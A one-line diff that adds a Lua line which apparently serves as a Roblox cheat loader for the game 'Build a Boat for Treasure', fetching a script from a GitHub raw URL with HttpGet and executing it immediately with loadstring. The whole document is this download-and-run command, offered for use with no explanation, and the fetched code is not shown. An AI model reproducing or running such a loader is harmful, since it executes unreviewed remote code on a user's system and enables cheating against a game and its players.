@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/build-a-boat-for-treasure-spam2-v9gbvuijeg3qrs.lua"))()
